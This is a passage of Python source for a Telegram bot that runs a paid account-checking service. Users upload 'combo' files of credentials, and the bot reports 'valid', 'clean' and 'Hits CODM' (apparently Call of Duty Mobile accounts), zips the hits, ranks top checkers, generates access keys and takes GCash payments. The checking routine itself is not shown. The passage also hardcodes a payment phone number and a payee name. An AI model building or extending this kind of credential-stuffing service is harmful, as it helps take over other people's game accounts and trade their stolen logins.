            parse_mode=ParseMode.HTML, reply_markup=main_kb); return
    st=sess.get("status","unknown"); fn=Path(sess["file"]).name if sess.get("file") else "N/A"
    lk=sess.get("lvl_key","lvl_all"); ck=sess.get("cf_key","cf_both")
    sm={"waiting_file":"Waiting for file","file_received":"File ready","checking":"Checking","done":"Finished"}
    ls2=sess.get("live_stats"); cur=ls2.get_stats() if ls2 else {}
    m=await update.message.reply_text(
        f"{pe(2)} <b>Session Status</b>\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Status  : <b>{sm.get(st,st)}</b>\n"
        f"{pe(1)} File    : <code>{fn}</code>\n"
        f"{pe(1)} Level   : {LEVEL_OPTIONS.get(lk,LEVEL_OPTIONS['lvl_all'])['label']}\n"
        f"{pe(1)} Filter  : {CLEAN_OPTIONS.get(ck,CLEAN_OPTIONS['cf_both'])['label']}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Processed: <code>{cur.get('total',0):,}</code> {pe(2)}\n"
        f"{pe(3)} Hits CODM: <code>{cur.get('has_codm',0):,}</code> {pe(3)}",
        parse_mode=ParseMode.HTML, reply_markup=main_kb)
    if m: track(uid,m.message_id)

async def cmd_check(update,context):
    """Show live stats card — also works after checking finishes."""
    uid=str(update.effective_user.id)
    try: await update.message.delete()
    except: pass
    with sessions_lock: sess=active_sessions.get(uid)
    if not sess or sess.get("status") not in ("checking","done"):
        m=await update.effective_chat.send_message("ℹ No active checking session.\nUse /start to begin.",parse_mode=ParseMode.HTML)
        if m: track(uid,m.message_id)
        return

    status=sess.get("status","checking")
    ls2=sess.get("live_stats")
    lk=sess.get("lvl_key","lvl_all"); ck=sess.get("cf_key","cf_both")
    ll=LEVEL_OPTIONS.get(lk,LEVEL_OPTIONS["lvl_all"])["label"]
    cl=CLEAN_OPTIONS.get(ck,CLEAN_OPTIONS["cf_both"])["label"]

    # ── If session is done, use stored final_stats directly ──────────────
    if status=="done":
        display_stats=sess.get("final_stats") or {}
        if not display_stats and ls2:
            # fallback: compute from live_stats + prev_stats
            _cs=ls2.get_stats()
            _ps=sess.get("prev_stats",{})
            _pp=sess.get("prev_processed",0)
            display_stats=dict(_cs)
            if _ps:
                for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"):
                    display_stats[_k]=_cs.get(_k,0)+_ps.get(_k,0)
            display_stats["total"]=_pp+_cs.get("total",0)
        t=display_stats.get("total",0)
        orig=sess.get("orig_total",t)
        rf_path=sess.get("result_folder") if sess else None
        card=stats_card(t,orig,display_stats,ll,cl,result_folder=rf_path)
        # Append finished label
        card=card.rstrip()+"<b>\n\n Checking finished!</b>"
        m=await update.effective_chat.send_message(card,parse_mode=ParseMode.HTML)
        if m: track(uid,m.message_id)
        return

    # ── Active checking ──────────────────────────────────────────────────
    combo=sess.get("file")
    cur_stats=ls2.get_stats() if ls2 else {}
    with sessions_lock:
        prev_s=active_sessions.get(uid,{}).get("prev_stats",{})
        prev_proc=active_sessions.get(uid,{}).get("prev_processed",0)
    orig=sess.get("orig_total",0)
    curr_done=cur_stats.get("total",0)
    done_count=prev_proc+curr_done
    total_disp=orig if orig else done_count
    if total_disp and done_count>total_disp: done_count=total_disp
    if prev_s:
        display_stats=dict(cur_stats)
        for _k in ("valid","invalid","clean","not_clean","has_codm","no_codm"):
            display_stats[_k]=cur_stats.get(_k,0)+prev_s.get(_k,0)
        display_stats["total"]=done_count
    else:
        display_stats=dict(cur_stats)
        display_stats["total"]=done_count
    rf_path=sess.get("result_folder") if sess else None
    card=stats_card(done_count,total_disp,display_stats,ll,cl,result_folder=rf_path)
    m=await update.effective_chat.send_message(card,parse_mode=ParseMode.HTML)
    if m: track(uid,m.message_id)

async def cmd_myresultsfile(update,context):
    """Send a snapshot zip of current in-progress results — does NOT stop checking."""
    uid=str(update.effective_user.id)
    ok,ud,_=await gate(update,context)
    if not ok: return

    with sessions_lock:
        sess=active_sessions.get(uid)

    if not sess or sess.get("status")!="checking":
        m=await update.message.reply_text(
            " <b>No active checking session.</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "Start a session first via /start, then use /myresultsfile "
            "anytime during checking to get a snapshot of your current hits.",
            parse_mode=ParseMode.HTML)
        if m: track(uid,m.message_id)
        return

    rf_str=sess.get("result_folder","")
    if not rf_str or not Path(rf_str).exists():
        m=await update.message.reply_text(
            " <b>No results folder found.</b>\n"
            "Checking may have just started — try again in a moment.",
            parse_mode=ParseMode.HTML)
        if m: track(uid,m.message_id)
        return

    rf_path=Path(rf_str)
    result_files=[f for f in rf_path.rglob("*") if f.is_file() and not f.name.endswith(".zip")]
    if not result_files:
        m=await update.message.reply_text(
            " <b>No hits yet.</b>\n"
            "Keep checking — use /myresultsfile again once hits come in!",
            parse_mode=ParseMode.HTML)
        if m: track(uid,m.message_id)
        return

    ts_snap=datetime.now().strftime("%Y%m%d_%H%M%S")
    snap_zip=rf_path/f"snapshot_{uid}_{ts_snap}.zip"
    try:
        with zipfile.ZipFile(snap_zip,"w",zipfile.ZIP_DEFLATED) as zf:
            for f in result_files:
                zf.write(f,f.relative_to(rf_path))
    except Exception as e:
        m=await update.message.reply_text(f" Could not create snapshot: <code>{e}</code>",parse_mode=ParseMode.HTML)
        if m: track(uid,m.message_id)
        return

    ls2=sess.get("live_stats")
    cur_stats=ls2.get_stats() if ls2 else {}
    prev_s=sess.get("prev_stats",{})
    hits=(cur_stats.get("has_codm",0)+(prev_s.get("has_codm",0) if prev_s else 0))
    clean=(cur_stats.get("clean",0)+(prev_s.get("clean",0) if prev_s else 0))
    processed=(sess.get("prev_processed",0)+cur_stats.get("total",0))

    try:
        nm=await update.message.reply_text(
            f" <b>Results Snapshot</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f" Hits (CODM) : <code>{hits:,}</code>\n"
            f" Clean       : <code>{clean:,}</code>\n"
            f" Processed   : <code>{processed:,}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f" Checking is still running! /check for live stats.",
            parse_mode=ParseMode.HTML)
        if nm: track(uid,nm.message_id)
        if snap_zip.exists() and snap_zip.stat().st_size>50:
            with open(snap_zip,"rb") as f:
                dm=await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,filename=snap_zip.name,
                    caption=" Snapshot — checking still running, more hits may come!")
            if dm: track(uid,dm.message_id)
    except Exception as e:
        log.warning(f"myresultsfile send failed uid={uid}: {e}")
    finally:
        try:
            if snap_zip.exists(): snap_zip.unlink()
        except: pass

async def cmd_clean(update,context):
    uid=str(update.effective_user.id); chat=update.effective_chat.id
    try: await update.message.delete()
    except: pass
    with bot_msg_lock: ids=list(bot_messages.get(uid,[]))
    d=f=0
    for mid in ids:
        try: await context.bot.delete_message(chat_id=chat,message_id=mid); d+=1
        except: f+=1
        await asyncio.sleep(0.05)
    with bot_msg_lock: bot_messages.pop(uid,None)
    try:
        c=await context.bot.send_message(chat_id=chat,
            text=f" Deleted <b>{d}</b> message(s).\n<i>Self-destructing in 5s…</i>",parse_mode=ParseMode.HTML)
        await asyncio.sleep(5); await c.delete()
    except: pass

# ════════════════════════════════════════════
#  NEW USER & ADMIN COMMANDS
# ════════════════════════════════════════════

async def cmd_myinfo(update, context):
    """Show detailed info about yourself."""
    cfg=load_config(); tg=update.effective_user; uid=str(tg.id)
    if not await gate(update, context): return
    ud,_=get_or_create_user(uid, tg.username or "", tg.first_name or "")
    is_adm=is_admin(tg.id,cfg); is_vip=ud.get("vip",False)
    custom_l=ud.get("custom_limit"); ml=cfg.get("max_lines_per_check")
    lim=custom_l or (cfg.get("vip_limit") if (is_vip or is_adm) else cfg.get("global_limit"))
    exp_s=fmt_expiry(ud.get("key_expires_at"))
    cd_on,cd_left=check_cooldown(uid,cfg)
    cd_s=f"{'%dh %dm'%(int(cd_left//60),int(cd_left%60)) if cd_left>=60 else '%dm'%int(cd_left)} left" if cd_on else "None"
    badge="👑 Admin" if is_adm else ("⭐ VIP" if is_vip else "👤 User")
    ban_s="🚫 BANNED" if ud.get("banned") else "✅ Active"
    note_s=f"\n{pe(1)} Note       : <i>{ud.get('note')}</i>" if ud.get("note") else ""
    await update.message.reply_text(
        f"{pe(5)} <b>My Profile</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Name       : <b>{tg.first_name}</b>\n"
        f"{pe(1)} Username   : @{tg.username or 'N/A'}\n"
        f"{pe(1)} ID         : <code>{tg.id}</code>\n"
        f"{pe(1)} Badge      : {badge}\n"
        f"{pe(1)} Status     : {ban_s}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Total Checked  : <code>{ud.get('total_checked',0):,}</code> {pe(2)}\n"
        f"{pe(1)} Sessions       : <code>{ud.get('sessions_count',0)}</code>\n"
        f"{pe(1)} Limit          : <code>{lim or 'Unlimited'}</code>\n"
        f"{pe(1)} Max/Session    : <code>{ml or 'Unlimited'}</code>\n"
        f"{pe(1)} Cooldown       : <code>{cd_s}</code>\n"
        f"{pe(1)} Key expires    : {exp_s}"
        f"{note_s}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Joined     : <code>{ud.get('joined','?')[:10]}</code>",
        parse_mode=ParseMode.HTML)

async def cmd_help(update, context):
    """Show help / command list."""
    cfg=load_config(); tg=update.effective_user; uid=str(tg.id)
    if not await gate(update, context): return
    is_adm=is_admin(tg.id,cfg)
    user_cmds=(
        f"{pe(2)} <b>User Commands</b> {pe(2)}\n"
        f"{pe(1)} /start — Open bot & see your profile\n"
        f"{pe(1)} /redeem — Redeem an access key\n"
        f"{pe(1)} /myinfo — View your detailed profile\n"
        f"{pe(1)} /status — Check your active session\n"
        f"{pe(1)} /check — View live check stats\n"
        f"{pe(1)} /stop — Stop current checker\n"
        f"{pe(1)} /deletefile — Delete your combo file\n"
        f"{pe(1)} /myresultsfile — Get your result file\n"
        f"{pe(1)} /hitson · /hitsoff — Toggle hit notifications\n"
        f"{pe(1)} /clean — Delete bot messages in chat"
    )
    adm_cmds=(
        f"\n{pe_sep()}\n"
        f"{pe(3)} <b>Admin Commands</b> {pe(3)}\n"
        f"{pe(1)} /admin — Open admin panel\n"
        f"{pe(1)} /userinfo <id|@user> — User lookup\n"
        f"{pe(1)} /topusers — Leaderboard\n"
        f"{pe(1)} /sysinfo — System info\n"
        f"{pe(1)} /maintenance [on|off] — Toggle maintenance\n"
        f"{pe(1)} /setannouncement <text|off> — Set announcement\n"
        f"{pe(1)} /announcement — Show current announcement\n"
        f"{pe(1)} /setmlimit <n|off> — Set max lines/check\n"
        f"{pe(1)} /keyinfo <key> — Look up a key\n"
        f"{pe(1)} /batchkey <type> <dur> <count> [max_u] — Batch keys\n"
        f"{pe(1)} /usernote <id> <note> — Add note to user\n"
        f"{pe(1)} /setuserlimit <id> <n|off> — Per-user limit\n"
        f"{pe(1)} /stats — Full statistics\n"
        f"{pe(1)} /broadcast <msg> — Broadcast to all users\n"
        f"{pe(1)} /stopall · /continueall — Mass stop/resume"
    ) if is_adm else ""
    await update.message.reply_text(
        f"{pe(5)} <b>Bot Help</b> {pe(5)}\n{pe_sep()}\n{user_cmds}{adm_cmds}",
        parse_mode=ParseMode.HTML)

async def cmd_userinfo(update, context):
    """Admin: look up a user by ID or username."""
    cfg=load_config(); tg=update.effective_user; uid=str(tg.id)
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    args=context.args
    if not args:
        await update.message.reply_text(f"{pe(1)} Usage: /userinfo <code>user_id</code> or /userinfo <code>@username</code>", parse_mode=ParseMode.HTML); return
    q=args[0].lstrip("@"); users=load_users(); found_uid=None; found_ud=None
    for u,d in users.items():
        if q==u or q.lower()==d.get("username","").lower():
            found_uid=u; found_ud=d; break
    if not found_ud:
        await update.message.reply_text(f"{pe(1)} User <code>{q}</code> not found.", parse_mode=ParseMode.HTML); return
    is_vip=found_ud.get("vip",False); is_adm2=is_admin(int(found_uid),cfg)
    badge="👑 Admin" if is_adm2 else ("⭐ VIP" if is_vip else "👤 User")
    ban_s="🚫 BANNED" if found_ud.get("banned") else "✅ Active"
    note_s=f"\n{pe(2)} Note : <i>{found_ud.get('note')}</i>" if found_ud.get("note") else ""
    await update.message.reply_text(
        f"{pe(5)} <b>User Info</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Name     : <b>{found_ud.get('first_name','?')}</b>\n"
        f"{pe(1)} Username : @{found_ud.get('username','N/A')}\n"
        f"{pe(1)} ID       : <code>{found_uid}</code>\n"
        f"{pe(1)} Badge    : {badge}\n"
        f"{pe(1)} Status   : {ban_s}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Total Checked  : <code>{found_ud.get('total_checked',0):,}</code> {pe(2)}\n"
        f"{pe(1)} Sessions       : <code>{found_ud.get('sessions_count',0)}</code>\n"
        f"{pe(1)} Custom Limit   : <code>{found_ud.get('custom_limit') or 'Default'}</code>\n"
        f"{pe(1)} Key expires    : {fmt_expiry(found_ud.get('key_expires_at'))}\n"
        f"{pe(1)} Joined         : <code>{found_ud.get('joined','?')[:10]}</code>\n"
        f"{pe(1)} Last seen      : <code>{found_ud.get('last_seen','?')[:10]}</code>"
        f"{note_s}",
        parse_mode=ParseMode.HTML)

async def cmd_topusers(update, context):
    """Show top 10 users by accounts checked."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    users=load_users()
    top=sorted(users.items(), key=lambda x: x[1].get("total_checked",0), reverse=True)[:10]
    medals=["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"]
    lines=[f"{pe(5)} <b>🏆 Top 10 Checkers</b> {pe(5)}\n{pe_sep()}"]
    for i,(uid2,ud2) in enumerate(top):
        fn2=ud2.get("first_name","?"); un2=ud2.get("username","")
        tc2=ud2.get("total_checked",0); badge2="⭐" if ud2.get("vip") else ""
        lines.append(f"{medals[i]} <b>{fn2}</b>{badge2}{' @'+un2 if un2 else ''}\n    Checked: <code>{tc2:,}</code>  Sessions: <code>{ud2.get('sessions_count',0)}</code>")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)

async def cmd_sysinfo(update, context):
    """Admin: show system info."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    import platform
    mb=_get_rss_mb()
    uptime_s=int(time.time()-_railway_start); h,m_,s2=uptime_s//3600,(uptime_s%3600)//60,uptime_s%60
    try:
        with open("/proc/loadavg","r") as f: la=f.read().split()[:3]; load_s=f"1m:{la[0]} 5m:{la[1]} 15m:{la[2]}"
    except: load_s="N/A"
    try:
        with open("/proc/meminfo","r") as f:
            mi={l.split(":")[0]:int(l.split()[1]) for l in f if ":" in l and l.split()[1].isdigit()}
        total_mb=mi.get("MemTotal",0)//1024; free_mb=mi.get("MemAvailable",0)//1024
        mem_str=f"{total_mb-free_mb}MB/{total_mb}MB ({int((total_mb-free_mb)/total_mb*100)}%)" if total_mb else "N/A"
    except: mem_str=f"RSS:{mb:.0f}MB"
    with sessions_lock: live=sum(1 for s in active_sessions.values() if s.get("status")=="checking")
    with _queue_lock: q=len(_checker_queue)
    await update.message.reply_text(
        f"{pe(5)} <b>🖥 System Info</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Process RAM : <code>{mb:.1f}MB</code> (limit: {_MEM_LIMIT_MB}MB)\n"
        f"{pe(1)} System RAM  : <code>{mem_str}</code>\n"
        f"{pe(1)} CPU Load    : <code>{load_s}</code>\n"
        f"{pe(1)} Uptime      : <code>{h}h {m_}m {s2}s</code>\n"
        f"{pe(1)} Python      : <code>{platform.python_version()}</code>\n"
        f"{pe(1)} Active      : <code>{live}</code> checkers\n"
        f"{pe(1)} Queue       : <code>{q}</code> waiting\n"
        f"{pe(1)} PID         : <code>{os.getpid()}</code>",
        parse_mode=ParseMode.HTML)

async def cmd_maintenance(update, context):
    """Admin: toggle or configure maintenance mode."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    args=context.args
    if not args:
        cur="🔴 ON" if cfg.get("maintenance_mode") else "🟢 Off"
        await update.message.reply_text(
            f"{pe(2)} <b>Maintenance Mode</b>\n{pe_sep()}\n{pe(1)} Status: <b>{cur}</b>\n"
            f"{pe(1)} Message: <i>{cfg.get('maintenance_message','')}</i>\n{pe_sep()}\n"
            f"Usage: /maintenance on|off\n/maintenance message Your custom message here",
            parse_mode=ParseMode.HTML); return
    if args[0].lower()=="on":
        cfg["maintenance_mode"]=True; msg2=" ".join(args[1:])
        if msg2: cfg["maintenance_message"]=msg2
    elif args[0].lower()=="off":
        cfg["maintenance_mode"]=False
    elif args[0].lower()=="message":
        cfg["maintenance_message"]=" ".join(args[1:])
    else:
        await update.message.reply_text(f"{pe(1)} Use: on|off|message", parse_mode=ParseMode.HTML); return
    save_config(cfg)
    status="🔴 ENABLED" if cfg.get("maintenance_mode") else "🟢 DISABLED"
    await update.message.reply_text(
        f"{pe(5)} <b>Maintenance {status}</b> {pe(5)}\n{pe_sep()}\n"
        f"{pe(1)} Message: <i>{cfg.get('maintenance_message','')}</i>", parse_mode=ParseMode.HTML)

async def cmd_announcement(update, context):
    """Show current announcement."""
    cfg=load_config(); tg=update.effective_user; uid=str(tg.id)
    if not await gate(update, context): return
    ann=cfg.get("announcement_text","").strip()
    if not ann:
        await update.message.reply_text(f"{pe(1)} No announcement set.", parse_mode=ParseMode.HTML); return
    await update.message.reply_text(
        f"{pe(3)} <b>📢 Announcement</b> {pe(3)}\n{pe_sep()}\n{ann}", parse_mode=ParseMode.HTML)

async def cmd_set_announcement(update, context):
    """Admin: set or clear the announcement."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    text=" ".join(context.args).strip()
    if not text:
        await update.message.reply_text(f"{pe(1)} Usage: /setannouncement <code>Your text here</code>\nor /setannouncement off", parse_mode=ParseMode.HTML); return
    if text.lower()=="off": cfg["announcement_text"]=""
    else: cfg["announcement_text"]=text
    save_config(cfg)
    val=cfg["announcement_text"]
    await update.message.reply_text(
        f"{pe(3)} <b>Announcement {'Cleared' if not val else 'Set'}</b> {pe(3)}\n{pe_sep()}\n{val or 'No announcement set.'}",
        parse_mode=ParseMode.HTML)

async def cmd_set_mlimit(update, context):
    """Admin: set max lines per check session."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    args=context.args
    if not args:
        await update.message.reply_text(
            f"{pe(2)} <b>Max Lines Per Check</b>\n{pe_sep()}\n"
            f"{pe(1)} Current: <code>{cfg.get('max_lines_per_check') or 'Unlimited'}</code>\n{pe_sep()}\n"
            f"Usage: /setmlimit <code>5000</code> or /setmlimit off", parse_mode=ParseMode.HTML); return
    val=args[0].lower()
    if val in ("off","0","none"): cfg["max_lines_per_check"]=None
    else:
        try: cfg["max_lines_per_check"]=max(1,int(val))
        except: await update.message.reply_text(f"{pe(1)} Invalid number.", parse_mode=ParseMode.HTML); return
    save_config(cfg)
    await update.message.reply_text(
        f"{pe(3)} <b>Max Lines/Check Set</b> {pe(3)}\n{pe_sep()}\n"
        f"{pe(2)} Max lines per session: <code>{cfg.get('max_lines_per_check') or 'Unlimited'}</code> {pe(2)}",
        parse_mode=ParseMode.HTML)

async def cmd_keyinfo(update, context):
    """Admin: look up info about a specific key."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    if not context.args:
        await update.message.reply_text(f"{pe(1)} Usage: /keyinfo <code>KEY</code>", parse_mode=ParseMode.HTML); return
    k=context.args[0].strip(); keys=load_keys()
    if k not in keys:
        await update.message.reply_text(f"{pe(1)} Key <code>{k}</code> not found.", parse_mode=ParseMode.HTML); return
    kd=keys[k]; used=kd.get("used_by",[]); max_u=kd.get("max_users",1)
    exp=fmt_expiry(kd.get("expires_at")); dtype=kd.get("duration_type","?"); dval=kd.get("duration_val",0)
    created=kd.get("created_at","?")[:10]; cb=kd.get("created_by","?")
    users=load_users()
    user_lines=[]
    for ub in used:
        ud2=users.get(str(ub),{}); fn2=ud2.get("first_name","?"); un2=ud2.get("username","")
        user_lines.append(f"  {pe(1)} <code>{ub}</code> — {fn2}{' @'+un2 if un2 else ''}")
    await update.message.reply_text(
        f"{pe(5)} <b>Key Info</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Key       : <code>{k}</code>\n"
        f"{pe(1)} Type      : <code>{dtype} {dval if dtype!='lifetime' else ''}</code>\n"
        f"{pe(1)} Expires   : {exp}\n"
        f"{pe(1)} Used      : <code>{len(used)}/{max_u}</code>\n"
        f"{pe(1)} Created   : <code>{created}</code> by <code>{cb}</code>\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Users:\n" + "\n".join(user_lines if user_lines else [f"  {pe(1)} None yet"]),
        parse_mode=ParseMode.HTML)

async def cmd_batchkey(update, context):
    """Admin: generate multiple keys at once."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    args=context.args
    if len(args)<3:
        await update.message.reply_text(
            f"{pe(2)} <b>Batch Key Generation</b>\n{pe_sep()}\n"
            f"Usage: /batchkey <code>type duration count [max_users]</code>\n\n"
            f"Example: /batchkey days 30 5 1\n"
            f"Types: hours, days, months, lifetime", parse_mode=ParseMode.HTML); return
    try:
        dtype=args[0]; dval=int(args[1]); count=min(int(args[2]),50); mu=int(args[3]) if len(args)>3 else 1
    except: await update.message.reply_text(f"{pe(1)} Invalid format.", parse_mode=ParseMode.HTML); return
    if dtype not in ("hours","days","months","lifetime"):
        await update.message.reply_text(f"{pe(1)} Type must be hours/days/months/lifetime.", parse_mode=ParseMode.HTML); return
    import uuid as _uuid3
    exp=compute_expiry(dtype,dval); keys=load_keys(); generated=[]
    dd={"hours":f"{dval}h","days":f"{dval}d","months":f"{dval}mo","lifetime":"Lifetime"}[dtype]
    for _ in range(count):
        k=f"Zia-{_uuid3.uuid4().hex[:8].upper()}-{_uuid3.uuid4().hex[:4].upper()}"
        keys[k]={"max_users":mu,"used_by":[],"duration_type":dtype,"duration_val":dval,
                 "expires_at":exp,"created_at":datetime.now().isoformat(),"created_by":tg.id}
        generated.append(k)
    save_keys(keys)
    key_lines="\n".join(f"<code>{k}</code>" for k in generated)
    await update.message.reply_text(
        f"{pe(5)} <b>🔑 {count} Keys Generated!</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(1)} Duration  : <b>{dd}</b>\n"
        f"{pe(1)} Max Users : <code>{mu}</code> each\n"
        f"{pe_sep()}\n{key_lines}", parse_mode=ParseMode.HTML)

async def cmd_usernote(update, context):
    """Admin: add a note to a user."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    args=context.args
    if len(args)<2:
        await update.message.reply_text(f"{pe(1)} Usage: /usernote <code>user_id note text here</code>", parse_mode=ParseMode.HTML); return
    target=args[0]; note=" ".join(args[1:])
    users=load_users()
    if target not in users:
        await update.message.reply_text(f"{pe(1)} User <code>{target}</code> not found.", parse_mode=ParseMode.HTML); return
    if note.lower()=="clear": users[target]["note"]=""
    else: users[target]["note"]=note
    save_users(users)
    await update.message.reply_text(
        f"{pe(3)} <b>Note {'Cleared' if note.lower()=='clear' else 'Saved'}</b> {pe(3)}\n{pe_sep()}\n"
        f"{pe(1)} User : <code>{target}</code>\n{pe(1)} Note : <i>{users[target].get('note','')or'(cleared)'}</i>",
        parse_mode=ParseMode.HTML)

async def cmd_set_user_limit(update, context):
    """Admin: set or clear a per-user custom limit."""
    cfg=load_config(); tg=update.effective_user
    if not is_admin(tg.id,cfg):
        await update.message.reply_text(f"{pe(1)} Admin only.", parse_mode=ParseMode.HTML); return
    args=context.args
    if len(args)<2:
        await update.message.reply_text(f"{pe(1)} Usage: /setuserlimit <code>user_id limit</code> or <code>off</code>", parse_mode=ParseMode.HTML); return
    target=args[0]; val=args[1].lower()
    users=load_users()
    if target not in users:
        await update.message.reply_text(f"{pe(1)} User <code>{target}</code> not found.", parse_mode=ParseMode.HTML); return
    if val in ("off","0","none"): users[target]["custom_limit"]=None
    else:
        try: users[target]["custom_limit"]=max(1,int(val))
        except: await update.message.reply_text(f"{pe(1)} Invalid number.", parse_mode=ParseMode.HTML); return
    save_users(users)
    new_lim=users[target].get("custom_limit")
    await update.message.reply_text(
        f"{pe(3)} <b>User Limit Set</b> {pe(3)}\n{pe_sep()}\n"
        f"{pe(1)} User  : <code>{target}</code>\n{pe(2)} Limit : <code>{new_lim or 'Default'}</code> {pe(2)}",
        parse_mode=ParseMode.HTML)

# ════════════════════════════════════════════
#  CALLBACK HANDLER
# ════════════════════════════════════════════
async def on_callback(update,context):
    query=update.callback_query; await query.answer()
    cfg=load_config(); tg=query.from_user; uid=str(tg.id); data=query.data

    # delete_all_msgs
    if data=="delete_all_msgs":
        await query.answer(" Deleting…")
        with bot_msg_lock: ids=list(bot_messages.get(uid,[]))
        if query.message and query.message.message_id not in ids: ids.append(query.message.message_id)
        d=f=0
        for mid in ids:
            try: await context.bot.delete_message(chat_id=query.message.chat_id,message_id=mid); d+=1
            except: f+=1
            await asyncio.sleep(0.05)
        with bot_msg_lock: bot_messages.pop(uid,None)
        try:
            c=await context.bot.send_message(chat_id=query.message.chat_id,
                text=f" Deleted <b>{d}</b> message(s).\n<i>Self-destructing in 5s…</i>",parse_mode=ParseMode.HTML)
            await asyncio.sleep(5); await c.delete()
        except: pass
        return

    # ── GCash: show plans inline ─────────────────────────────────────────
    if data == "gcash_buy":
        cfg2 = load_config()
        gcash_num  = cfg2.get("gcash_number","09497330622")
        gcash_name = cfg2.get("gcash_name","J.Q.")
        await query.edit_message_text(
            f"{pe(5)} <b>BUY A KEY — GCash</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(3)} Piliin ang plan mo! {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} 🔑 1 Day     — ₱50\n"
            f"{pe(2)} 🔑 3 Days    — ₱120\n"
            f"{pe(2)} 🔑 7 Days    — ₱250\n"
            f"{pe(2)} 🔑 30 Days   — ₱800\n"
            f"{pe(3)} 💎 Lifetime  — ₱2,000\n"
            f"{pe_sep()}\n"
            f"{pe(1)} I-tap ang plan para sa payment steps!",
            parse_mode=ParseMode.HTML, reply_markup=kb_gcash_plans())
        return

    # ── GCash: user selected a plan ──────────────────────────────────────
    if data.startswith("gcash_sel:"):
        plan_key = data.split(":", 1)[1]
        plan = GCASH_PLANS.get(plan_key)
        if not plan:
            await query.answer("Unknown plan.", show_alert=True); return
        cfg2 = load_config()
        gcash_num  = cfg2.get("gcash_number","09497330622")
        gcash_name = cfg2.get("gcash_name","J.Q.")
        # Save awaiting state
        with sessions_lock:
            if uid not in active_sessions: active_sessions[uid] = {}
            active_sessions[uid]["awaiting_receipt"] = plan_key
        await query.edit_message_text(
            f"{pe(5)} <b>PAYMENT STEPS</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(3)} Plan     : <b>{plan['label']}</b> {pe(3)}\n"
            f"{pe(2)} Bayad    : <b>{plan['price']}</b> {pe(2)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} <b>PAANO MAGBAYAD:</b> {pe(2)}\n"
            f"{pe_thin()}\n"
            f"{pe(1)} 1️⃣  I-open ang GCash app\n"
            f"{pe(1)} 2️⃣  Send Money → <b><code>{gcash_num}</code></b>\n"
            f"{pe(1)} 3️⃣  Amount: <b>{plan['price']}</b>\n"
            f"{pe(1)} 4️⃣  Name: <b>{gcash_name}</b>\n"
            f"{pe(1)} 5️⃣  Kunan ng screenshot ang resibo\n"
            f"{pe(1)} 6️⃣  I-send dito bilang <b>PHOTO</b> (hindi file!)\n"
            f"{pe_sep()}\n"
            f"{pe(3)} Mag-send ng resibo photo ngayon! {pe(3)}\n"
            f"{pe(1)} <i>Admin will approve within 5–30 minutes.</i>",
            parse_mode=ParseMode.HTML)
        return

    # ── GCash: admin approves payment ────────────────────────────────────
    if data.startswith("gcash_approve:"):
        if not is_admin(tg.id, cfg):
            await query.answer("Admin only.", show_alert=True); return
        _, buyer_uid, plan_key = data.split(":", 2)
        plan = GCASH_PLANS.get(plan_key, {})
        # Generate and assign key
        from secrets import token_hex as _th
        new_key = f"Zia-{_th(4).upper()}-{_th(4).upper()}"
        keys = load_keys()
        exp_iso = compute_expiry(plan.get("dtype","days"), plan.get("dval",1))
        keys[new_key] = {
            "dtype": plan.get("dtype","days"),
            "dval": plan.get("dval",1),
            "expires_at": exp_iso,
            "max_users": 1,
            "used_by": [buyer_uid],
            "vip": False,
            "note": f"GCash purchase {plan.get('label','')}",
        }
        save_keys(keys)
        # Activate user
        users = load_users()
        bu = users.setdefault(buyer_uid, {})
        bu["activated"] = True
        bu["key_used"]  = new_key
        bu["key_expires_at"] = exp_iso
        bu["activated_at"] = datetime.now().isoformat()
        bu["key_expired"] = False
        save_users(users)
        # Notify buyer
        try:
            await context.bot.send_message(
                chat_id=int(buyer_uid),
                text=(
                    f"{pe(5)} <b>APPROVED! KEY ACTIVATED!</b> {pe(5)}\n"
                    f"{pe_sep()}\n"
